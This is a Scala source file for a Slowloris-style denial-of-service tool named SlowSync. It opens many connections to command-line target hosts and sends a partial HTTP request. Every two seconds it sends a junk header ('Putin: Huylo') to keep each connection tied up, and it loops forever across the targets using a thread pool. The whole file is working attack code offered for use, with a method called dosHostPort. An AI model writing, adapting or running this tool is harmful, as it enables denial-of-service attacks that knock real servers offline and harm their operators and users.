package hi

import akka.dispatch.ExecutionContexts
import hi.SyncUDP.HostPort
import org.apache.log4j.Logger

import java.io.{BufferedWriter, OutputStreamWriter}
import java.net.Socket
import java.util.concurrent._
import scala.util.control.Breaks.{break, breakable}

object SlowSync {

  val header: String = "GET / HTTP/1.1\r\n" +
    "User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)\r\n" +
    "Host: putin-huylo.com\r\n" +
    "Accept-Language: en-us\r\n" +
    "Accept-Encoding: gzip, deflate\r\n" +
    "Connection: Keep-Alive\r\n";
  val keepAliveHeader = "Putin: Huylo \r\n"
  val logger = Logger.getLogger("Sync")

  def main(args: Array[String]): Unit = {

    if (args.length < 3) {
      println("Please specify the following parameters: <parallelism number>, <port>, <hosts> . " +
        "There should be minimum 3 of those")
    }
    val poolSize = args.head.toInt
    val port = args(1).toInt

    val executor = new ForkJoinPool(poolSize)
    val ec = ExecutionContexts.fromExecutorService(executor)

    val targets = fetchTargetsHosts(args)

    val queue = new LinkedBlockingQueue[HostPort](poolSize)

    while (true) {
      targets foreach { x =>
        queue.put(HostPort(x, port))
        ec.execute(() => dosHostPort(queue.take()))
      }
    }

    sys.addShutdownHook(() => {
      executor.shutdown()
      ec.shutdown()
    })
  }

  def fetchTargetsHosts(args: Array[String]): Seq[String] = {
    args.tail.toSeq
  }

  def dosHostPort(hp: HostPort): Unit = {

    logger.info(s"Started to work on: $hp")

    val keepAliveIntervalMillis = 2000

    val socket = new Socket(hp.ip, hp.port)
    val outWriter = new OutputStreamWriter(socket.getOutputStream)
    val out = new BufferedWriter(outWriter)

    out.write(header)
    out.flush()

    breakable {
      while (true) {

        try {
          Thread.sleep(keepAliveIntervalMillis)
          out.write(keepAliveHeader)
          out.flush()
          logger.info(s"Wrote keep alive header to the target: $hp")
        } catch {
          case e: Exception =>
            logger.warn(s"Exception was thrown: $e. Going to move to the next target")
            out.close()
            socket.close()
            outWriter.close()
            break
        }
      }
    }
  }
}
